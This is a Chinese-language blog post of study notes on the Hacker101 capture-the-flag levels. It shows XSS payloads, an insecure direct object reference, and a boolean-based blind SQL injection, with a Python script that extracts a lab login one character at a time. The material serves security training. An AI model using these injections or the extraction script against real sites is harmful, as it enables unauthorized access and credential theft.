---
title: "Hacker101"
date: 2019-10-11T16:31:29+08:00
showDate: true
draft: false
tags: ["security","hacker", "ctf"]
categories: ["security"]
---

# hacker101学习笔记

## 前言

记录自己在hacker101 ctf的学习笔记


### 第一关 	A little something to get you started (1/1 flag)

第一次接触ctf没什么经验， 各种看网页源代码，看http请求有点像无头苍蝇，后来看了下hint `Take a look at the source for the page`,然后发现了一个没有出现在页面里的style标签

```html
<style>
	body {background-image: url("background.png");}
</style>
```

试了下访问http://domain.com/background.png，报了404，然后试了试在当前目录加上/background.png，解决


### 第二关 	Micro-CMS v1 （4/4 flag) 

#### flag 1

有了第一关的经验，我大概懂了一些套路，第二关给了一个input框一个textarea标签

![2-1](./2-1.png)

大概猜出来应该是考xss，现在input框里试了一下`<script>alert('xss')</script>`，爆出了第一个flag

![2-2](./2-2.png)

#### flag 2

接着在textarea试了试`<script>alert('xss')</script>`, 虽然提交的是script， 看起来是后端把script替换成scrubbed。 

然后试了一下`<BODY onload="alert('XSS')">`，成功爆出flag

![2-3](./2-3.png)

既然是script被过滤的，那就再试试img标签吧。textarea里写了`<IMG SRC="" onerror="alert('XSS')">`，但是好像和上一个算同一个flag

![2-4](./2-4.png)


#### flag 3

在textarea标签里试了很多种xss，但是flag都是一样的，那看起来接下来的问题就不是考xss了。
里面有一个创建page的页面，试着创建了一个page发现创建出来的page的id好像不连续（初始的两个是1、2，创建的是9），试了下访问`/page/3`，报not found，再试了试`/page/4`，报forbidden，看来这里应该有问题，因为每个page都有一个对应的eidt页面`/page/edit/page_id`，试着访问`/page/edit/4`，出了flag

![2-5](2-5.png)

#### flag 4

第四个flag就有点顺了，访问完`/page/edit/4`，想看看有没有注入点，然后试了试`/page/edit/4'`，最后一个flag就这样出了。

![2-6](2-6.png)

#### 参考资料

### 第三关 Micro-CMS v2 （1/3 flag）

#### flag 1 

这一关一进来就说这是一个之前CMS的升级版本，修复的之前的安全问题，现在edit需要账号密码登录了，看起来是考sql注入吧。
试了试用户名框输入`'`提交，直接报错

```python
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")

```

从这里大概能看出一些信息比如执行的sql语句是

```sql
SELECT password FROM admins WHERE username='';
```

应该是查用户名的密码然后跟提交的比对，然后数据库是mariadb, 表名是admins

接着试

```sql
' or 1 = 1 #
```

然后提示是invalid passsword， 看起来是username被跳过但是密码因为为空所以错误了。

继续尝试

```sql
' or 1 = 1 and 1 > (select count(*) from admins) #
```

返回了unkonwn user， 说明` 1 > (select count(*) from admins) `为`false`，所以admins表里面只有不多于一条数据，接下来用length猜字段长度

```sql
' or 1 = 1 and 1 > (select count(*) from admins where length(username) = 6) #
' or 1 = 1 and 1 > (select count(*) from admins where length(password) = 6) #
```

说明username和password长度都是6

然后是猜每个位置的字母

```sql
' or 1 = 1 and 1 >  (select count(*) from admins where left(username, 1) = 'a')#
```

手动尝试的话也要几百次，于是尝试下用python写个脚本，核心代码如下，功能为检测某个位置的字母是什么

```python
def get_username_word(idx, a):
    '''

    :param idx: 位置
    :param a: 字母
    :return:
    '''
    url = "http://35.227.24.107/ff1706e3ac/login"
    username = "' or 1 = 1 and 1 >  (select count(*) from admins where left(password, {}) = '{}')#".format(idx, a)
    # username = "mollie"
    # password = "jeanne"
    password = ""

    data = {
        "username": username,
        "password": ""
    }
    r = requests.post(url, data=data)
    if not re.search('Invalid password', r.text):
        print(idx, "is", a)
        return True
    else:
        print(idx, "is not", a)
    return False
```

最后跑出结果

```
    # username = "mollie"
    # password = "jeanne"
```

登陆后拿到flag

![2-7](2-7.png)


[常见xss过滤](https://damit5.com/2017/10/15/XSS-%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/)

未完待续~



